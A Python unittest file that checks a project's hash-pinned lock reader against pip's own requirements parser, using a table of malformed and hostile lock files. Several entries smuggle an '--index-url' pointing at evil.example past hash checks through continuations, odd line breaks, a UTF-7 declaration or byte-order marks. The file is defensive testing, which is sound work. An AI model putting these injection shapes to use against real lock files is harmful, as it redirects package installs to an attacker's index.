"""Parity of the lock reader with pip, tested against pip's own req_file code.

The install program must read the lock as pip does. A pip that moves req_file fails
this file with a message; it is never skipped."""

from __future__ import annotations

import dataclasses
import importlib
import importlib.metadata
import logging
import re
import shutil
import tempfile
import unittest
from pathlib import Path
from types import ModuleType

import check_pins

RUNTIME = check_pins.RUNTIME


class Reason:
    """The names of the program's refusal reasons that the table uses.

    The program is loaded by path, so its enum is not known to the type checker. A name here is
    the name of a member of install_runtime.Reason, and a test checks that each one is.
    """

    LOCK_UNHASHED = "LOCK_UNHASHED"
    LOCK_ENCODING = "LOCK_ENCODING"
    LOCK_NOT_TEXT = "LOCK_NOT_TEXT"


ROOT = Path(__file__).resolve().parents[2]
REPOSITORY_LOCK = ROOT / "ansible" / "requirements.txt"

HASH = "a" * 64
OTHER_HASH = "b" * 64
PINNED = f"alpha==1.0 --hash=sha256:{HASH}"
EVIL = "--index-url=https://evil.example/simple"
HASH_TOKEN = re.compile(r"--hash=sha256:[0-9a-f]{64}")
# Each of these ends a line for str.splitlines and is not "\n": pip and the program both
# split with it, so a lock can break a line where an editor shows none.
ODD_BREAKS = {
    "carriage return": "\r",
    "vertical tab": "\x0b",
    "form feed": "\x0c",
    "file separator": "\x1c",
    "next line": "\x85",
    "line separator": "\u2028",
}


class OracleUnavailable(Exception):  # noqa: N818 - the word for it in this file
    """pip's req_file module is not where, or what, this file expects."""


def load_oracle() -> ModuleType:
    """Return pip's req_file module.

    Raises:
        OracleUnavailable: The module, or a function this file calls in it, is not there.
    """
    try:
        module = importlib.import_module("pip._internal.req.req_file")
        for name in ("_decode_req_file", "preprocess", "break_args_options"):
            getattr(module, name)
    except (ImportError, AttributeError) as error:
        message = (
            f"pip's req_file module does not offer what this oracle uses ({error!r}); "
            "re-check the lock reader against the new pip, then update this file"
        )
        raise OracleUnavailable(message) from error
    return module


def bom(mark: bytes, encoding: str, text: str) -> bytes:
    """Return ``text`` in ``encoding`` after its byte-order mark."""
    return mark + text.encode(encoding)


@dataclasses.dataclass(frozen=True)
class Shape:
    """One lock, what the program must do with it, and what pip must see in it."""

    name: str
    data: bytes
    # None: the program accepts the lock. Otherwise the name of the reason it must refuse with.
    refuses: str | None
    # pip, reading these bytes, has a line with an option other than --hash.
    pip_option: bool
    # pip decodes these bytes to text other than their UTF-8 reading.
    pip_text_differs: bool = False


def shapes() -> list[Shape]:
    """Return the table of lock shapes."""
    unhashed = Reason.LOCK_UNHASHED
    table = [
        Shape("the repository's own lock", REPOSITORY_LOCK.read_bytes(), None, False),
        Shape(
            "a pin continued over hash lines, with a via comment after",
            (
                f"alpha==1.0 \\\n    --hash=sha256:{HASH} \\\n    --hash=sha256:{OTHER_HASH}\n"
                "    # via -r requirements.in\n"
            ).encode(),
            None,
            False,
        ),
        Shape(
            "the same with CRLF line ends",
            (
                f"alpha==1.0 \\\r\n    --hash=sha256:{HASH} \\\r\n    --hash=sha256:{OTHER_HASH}"
                "\r\n    # via -r requirements.in\r\n"
            ).encode(),
            None,
            False,
        ),
        Shape(
            "the same with bare carriage returns",
            f"alpha==1.0 \\\r    --hash=sha256:{HASH}\r# c\r".encode(),
            None,
            False,
        ),
        Shape(
            "a marker with double quotes",
            f'alpha==1.0 ; sys_platform == "linux" \\\n    --hash=sha256:{HASH}\n'.encode(),
            None,
            False,
        ),
        Shape(
            "a comment between two pins",
            f"{PINNED}\n# a note\nbeta==2.0 --hash=sha256:{HASH}\n".encode(),
            None,
            False,
        ),
        Shape("a final continuation with nothing after it", f"{PINNED} \\".encode(), None, False),
        Shape(
            "two backslashes ending a line",
            f"alpha==1.0 \\\\\n    --hash=sha256:{HASH}\n".encode(),
            None,
            False,
        ),
        Shape(
            "a coding declaration on the third line, which pip does not read",
            f"# one\n# two\n# coding: utf-7\n{PINNED}\n".encode(),
            None,
            False,
        ),
        # The shapes of the cycle-3 verdict. In each, pip reads --index-url as a line of its own.
        Shape(
            "a comment-only line ends a continuation, then an option",
            f"{PINNED} \\\n # c \\\n{EVIL}\n".encode(),
            unhashed,
            True,
        ),
        Shape(
            "a space after the backslash, with a comment, then an option",
            f"{PINNED} # c \\ \n{EVIL}\n".encode(),
            unhashed,
            True,
        ),
        Shape(
            "a space after the backslash, with no comment, then an option",
            f"{PINNED} \\ \n{EVIL}\n".encode(),
            unhashed,
            True,
        ),
        Shape(
            "a blank line ends a continuation, then an option",
            f"{PINNED} \\\n\n{EVIL}\n".encode(),
            unhashed,
            True,
        ),
        # Here pip reads the pin with no hash, and the hash as a line of its own: no foreign
        # option, but not a hashed pin either, so the program refuses it.
        Shape(
            "a comment-only line in the middle of a pin's continuation",
            f"alpha==1.0 \\\n# c\n    --hash=sha256:{HASH}\n".encode(),
            unhashed,
            False,
        ),
        Shape("an option on a line of its own", f"{PINNED}\n{EVIL}\n".encode(), unhashed, True),
        Shape(
            "an option joined onto the pin by a continuation",
            f"{PINNED} \\\n{EVIL}\n".encode(),
            unhashed,
            True,
        ),
        # pip expands ${NAME} from its environment (expand_env_variables), so the text after
        # the hash is whatever that variable holds; the program refuses the line unexpanded.
        Shape(
            "an environment variable pip would expand",
            f"{PINNED} ${{EXTRA_OPTION}}\n".encode(),
            unhashed,
            True,
        ),
        Shape(
            "tab in place of the space before the hash, which pip does not split on",
            f"alpha==1.0\t--hash=sha256:{HASH}\n".encode(),
            unhashed,
            False,
        ),
        # The shapes of the plan review: an encoding pip obeys and this program does not read.
        Shape(
            "a utf-7 coding declaration that turns a comment into an option",
            f"# -*- coding: utf-7 -*-\n{PINNED}\n# +AAo---index-url=https://evil.example/simple\n".encode(),
            Reason.LOCK_ENCODING,
            True,
            pip_text_differs=True,
        ),
        Shape(
            "a coding declaration on the second line",
            f"# header\n# coding=latin-1\n{PINNED}\n".encode(),
            Reason.LOCK_ENCODING,
            False,
        ),
        Shape(
            "a fileencoding modeline, which pip also takes as a declaration",
            f"# vim: set fileencoding=utf-8 :\n{PINNED}\n".encode(),
            Reason.LOCK_ENCODING,
            False,
        ),
        Shape(
            "invalid UTF-8 and no declaration",
            PINNED.encode() + b" \xff\n",
            Reason.LOCK_NOT_TEXT,
            False,
            pip_text_differs=True,
        ),
        Shape(
            "a UTF-8 byte-order mark",
            bom(b"\xef\xbb\xbf", "utf-8", f"{PINNED}\n"),
            Reason.LOCK_ENCODING,
            False,
            pip_text_differs=True,
        ),
        Shape(
            "a UTF-16 little-endian byte-order mark",
            bom(b"\xff\xfe", "utf-16-le", f"{PINNED}\n{EVIL}\n"),
            Reason.LOCK_ENCODING,
            True,
            pip_text_differs=True,
        ),
        Shape(
            "a UTF-16 big-endian byte-order mark",
            bom(b"\xfe\xff", "utf-16-be", f"{PINNED}\n{EVIL}\n"),
            Reason.LOCK_ENCODING,
            True,
            pip_text_differs=True,
        ),
        Shape(
            "a UTF-32 little-endian byte-order mark",
            bom(b"\xff\xfe\x00\x00", "utf-32-le", f"{PINNED}\n{EVIL}\n"),
            Reason.LOCK_ENCODING,
            True,
            pip_text_differs=True,
        ),
        Shape(
            "a UTF-32 big-endian byte-order mark",
            bom(b"\x00\x00\xfe\xff", "utf-32-be", f"{PINNED}\n{EVIL}\n"),
            Reason.LOCK_ENCODING,
            True,
            pip_text_differs=True,
        ),
    ]
    for label, character in ODD_BREAKS.items():
        table.append(
            Shape(
                f"a pin continued across a {label}",
                f"alpha==1.0 \\{character}    --hash=sha256:{HASH}\n".encode(),
                None,
                False,
            )
        )
        table.append(
            Shape(
                f"an option after a {label}",
                f"{PINNED}{character}{EVIL}\n".encode(),
                unhashed,
                True,
            )
        )
        table.append(
            Shape(
                f"an option joined on across a {label}",
                f"{PINNED} \\{character}{EVIL}\n".encode(),
                unhashed,
                True,
            )
        )
    return table


def pip_view(oracle: ModuleType, data: bytes) -> tuple[str, list[str]]:
    """Return the text pip decodes from ``data`` and the logical lines it then reads."""
    # pip logs a warning when it falls back to the locale for text that is not UTF-8; the
    # fallback is the very difference under test, so the warning is not output of this file.
    logging.disable(logging.WARNING)
    try:
        text: str = oracle._decode_req_file(data, "lock")  # noqa: SLF001 - the oracle is pip's own
    finally:
        logging.disable(logging.NOTSET)
    return text, [line for _number, line in oracle.preprocess(text)]


def pip_options(oracle: ModuleType, line: str) -> tuple[str, list[str]]:
    """Return the requirement part of a line as pip splits it, and its option tokens."""
    requirement, options = oracle.break_args_options(line)
    return requirement, options.split()


def pip_has_foreign_option(oracle: ModuleType, lines: list[str]) -> bool:
    """Whether any line carries an option that is not a --hash of a SHA-256."""
    return any(
        HASH_TOKEN.fullmatch(token) is None
        for line in lines
        for token in pip_options(oracle, line)[1]
    )


class ParityTests(unittest.TestCase):
    """The program's refusals, and what it accepts, against how pip reads the same bytes."""

    oracle: ModuleType
    version: str

    @classmethod
    def setUpClass(cls) -> None:
        """Load pip's reader and remember which pip it is."""
        cls.oracle = load_oracle()
        cls.version = importlib.metadata.version("pip")

    def refusal_of(self, data: bytes) -> str | None:
        """Return the name of the reason the program refuses ``data`` with, or None."""
        try:
            RUNTIME.check_lock_is_hashed(data)
        except RUNTIME.Refusal as refusal:
            name: str = refusal.reason.name
            return name
        return None

    def test_the_reason_names_in_the_table_are_members_of_the_programs_enum(self) -> None:
        for name in (Reason.LOCK_UNHASHED, Reason.LOCK_ENCODING, Reason.LOCK_NOT_TEXT):
            self.assertIn(name, RUNTIME.Reason.__members__)

    def test_the_program_gives_the_verdict_the_table_names_for_every_shape(self) -> None:
        for shape in shapes():
            with self.subTest(shape=shape.name, pip=self.version):
                self.assertEqual(shape.refuses, self.refusal_of(shape.data))

    def test_pip_reads_each_shape_as_the_table_says(self) -> None:
        # The control for the test above: a hostile shape that pip did not read as hostile would
        # make a refusal prove nothing, and a table entry can be wrong as easily as code.
        for shape in shapes():
            with self.subTest(shape=shape.name, pip=self.version):
                try:
                    text, lines = pip_view(self.oracle, shape.data)
                except UnicodeDecodeError:
                    self.assertTrue(shape.pip_text_differs)
                    continue
                self.assertEqual(
                    shape.pip_text_differs, text != shape.data.decode("utf-8", errors="replace")
                )
                self.assertEqual(shape.pip_option, pip_has_foreign_option(self.oracle, lines))

    def test_a_lock_the_program_accepts_reads_the_same_in_pip(self) -> None:
        accepted = [shape for shape in shapes() if shape.refuses is None]
        self.assertGreaterEqual(len(accepted), 2, "the table has no accepted shape to compare")
        for shape in accepted:
            with self.subTest(shape=shape.name, pip=self.version):
                text, lines = pip_view(self.oracle, shape.data)
                self.assertEqual(shape.data.decode("utf-8"), text)
                ours = [line for _number, line in RUNTIME.logical_lines(text)]
                self.assertEqual([line.strip() for line in lines], ours)
                for line in lines:
                    requirement, options = pip_options(self.oracle, line)
                    self.assertTrue(requirement, f"pip sees no requirement in {line!r}")
                    self.assertTrue(options, f"pip sees no hash in {line!r}")
                    for token in options:
                        self.assertRegex(token, HASH_TOKEN)

    def test_check_pins_refuses_what_the_program_refuses(self) -> None:
        # The other caller. Findings about tools the table's locks do not name are not the
        # point; a finding about a line, or about the encoding, is.
        directory = Path(tempfile.mkdtemp(prefix="parity-test-"))
        self.addCleanup(shutil.rmtree, directory, True)
        for shape in shapes():
            if shape.name == "the repository's own lock":
                continue
            with self.subTest(shape=shape.name, pip=self.version):
                path = directory / "requirements.txt"
                path.write_bytes(shape.data)
                _pins, findings = check_pins.locked_packages(path)
                about_the_lock = [finding for finding in findings if "does not pin" not in finding]
                if shape.refuses is None:
                    self.assertEqual([], about_the_lock)
                elif shape.refuses == Reason.LOCK_ENCODING:
                    said = RUNTIME.Reason.LOCK_ENCODING.value
                    self.assertTrue(
                        any(said in finding for finding in about_the_lock), about_the_lock
                    )
                elif shape.refuses == Reason.LOCK_NOT_TEXT:
                    self.assertTrue(
                        any("is not UTF-8 text" in finding for finding in about_the_lock),
                        about_the_lock,
                    )
                else:
                    self.assertTrue(
                        any("is not name==version" in finding for finding in about_the_lock),
                        about_the_lock,
                    )


if __name__ == "__main__":
    unittest.main()
